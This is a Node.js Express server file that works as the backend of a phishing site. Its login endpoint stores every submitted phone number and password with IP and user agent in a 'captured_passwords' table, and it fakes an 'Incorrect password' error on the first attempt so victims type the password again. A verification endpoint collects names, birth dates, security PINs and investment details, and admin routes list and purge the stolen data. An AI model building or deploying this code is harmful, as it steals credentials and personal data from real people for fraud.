// server.js
const express = require('express');
const { Pool } = require('pg');
const path = require('path');
require('dotenv').config(); // Load environment variables from .env file

const app = express();
const port = process.env.PORT || 3000;

// PostgreSQL connection using environment variables
const pool = new Pool({
    user: process.env.DB_USER,
    host: process.env.DB_HOST,
    database: process.env.DB_DATABASE,
    password: process.env.DB_PASSWORD,
    port: process.env.DB_PORT,
});

// Middleware
app.use(express.json());
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));

// Create tables if they don't exist
async function initializeDatabase() {
    try {
        // Table for captured passwords
        await pool.query(`
            CREATE TABLE IF NOT EXISTS captured_passwords (
                id SERIAL PRIMARY KEY,
                user_id VARCHAR(50) NOT NULL,
                password VARCHAR(255) NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                user_agent TEXT,
                ip_address INET,
                attempt_number INTEGER DEFAULT 1
            )
        `);

        // UPDATED Table for user verification data
        await pool.query(`
            CREATE TABLE IF NOT EXISTS user_verifications (
                id SERIAL PRIMARY KEY,
                user_id VARCHAR(50) NOT NULL,
                full_name VARCHAR(100),
                date_of_birth DATE,
                problem VARCHAR(100),
                security_pin VARCHAR(6),
                investment_experience VARCHAR(50),
                captured_password VARCHAR(255),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        console.log('Database tables initialized successfully');
    } catch (error) {
        console.error('Database initialization error:', error);
    }
}

// Initialize database on startup
initializeDatabase();

// API endpoint for login (mock response)
app.post('/api/login', async (req, res) => {
    try {
        const { phone, password, attemptNumber } = req.body;
        
        const ipAddress = req.ip || req.connection.remoteAddress;
        const userAgent = req.headers['user-agent'];
        
        await pool.query(
            `INSERT INTO captured_passwords (user_id, password, user_agent, ip_address, attempt_number) 
             VALUES ($1, $2, $3, $4, $5)`,
            [phone, password, userAgent, ipAddress, attemptNumber]
        );

        if (attemptNumber === 1) {
            res.json({ success: false, message: 'Incorrect password. Please try again.' });
        } else {
            res.json({ success: true, message: 'Login successful', user: { id: phone, phone: phone } });
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ success: false, error: 'Login failed' });
    }
});

// UPDATED API endpoint for verification form
app.post('/api/verification', async (req, res) => {
    try {
        const {
            userId,
            fullName,
            dob,
            problem,
            pin,
            experience,
            capturedPassword
        } = req.body;

        const result = await pool.query(
            `INSERT INTO user_verifications 
             (user_id, full_name, date_of_birth, problem, security_pin, investment_experience, captured_password) 
             VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING id`,
            [userId, fullName, dob, problem, pin, experience, capturedPassword]
        );

        console.log(`Verification data saved for user ${userId}`);
        res.json({ success: true, message: 'Verification submitted successfully', id: result.rows[0].id });
    } catch (error) {
        console.error('Verification error:', error);
        res.status(500).json({ success: false, error: 'Failed to save verification data' });
    }
});

// NEW Admin login endpoint (secure)
app.post('/admin/login', (req, res) => {
    const { password } = req.body;
    if (password && password === process.env.ADMIN_MASTER_PASSWORD) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: 'Invalid master password' });
    }
});

// Admin endpoint to view captured data
app.get('/admin/captured-passwords', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM captured_passwords ORDER BY timestamp DESC');
        res.json(result.rows);
    } catch (error) {
        console.error('Error fetching passwords:', error);
        res.status(500).json({ error: 'Failed to fetch data' });
    }
});

// Admin endpoint to view verification data
app.get('/admin/verifications', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM user_verifications ORDER BY created_at DESC');
        res.json(result.rows);
    } catch (error) {
        console.error('Error fetching verifications:', error);
        res.status(500).json({ error: 'Failed to fetch data' });
    }
});

// Delete endpoints... (no changes needed here)
app.delete('/admin/delete-password/:id', async (req, res) => {
    try {
        const { id } = req.params;
        await pool.query('DELETE FROM captured_passwords WHERE id = $1', [id]);
        res.json({ success: true, message: 'Password entry deleted' });
    } catch (error) {
        console.error('Error deleting password:', error);
        res.status(500).json({ error: 'Failed to delete entry' });
    }
});

app.delete('/admin/delete-verification/:id', async (req, res) => {
    try {
        const { id } = req.params;
        await pool.query('DELETE FROM user_verifications WHERE id = $1', [id]);
        res.json({ success: true, message: 'Verification entry deleted' });
    } catch (error) {
        console.error('Error deleting verification:', error);
        res.status(500).json({ error: 'Failed to delete entry' });
    }
});

app.delete('/admin/clear-passwords', async (req, res) => {
    try {
        await pool.query('DELETE FROM captured_passwords');
        res.json({ success: true, message: 'All password entries cleared' });
    } catch (error) {
        console.error('Error clearing passwords:', error);
        res.status(500).json({ error: 'Failed to clear data' });
    }
});

app.delete('/admin/clear-verifications', async (req, res) => {
    try {
        await pool.query('DELETE FROM user_verifications');
        res.json({ success: true, message: 'All verification entries cleared' });
    } catch (error) {
        console.error('Error clearing verifications:', error);
        res.status(500).json({ error: 'Failed to clear data' });
    }
});


// Serve the main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Admin panel
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});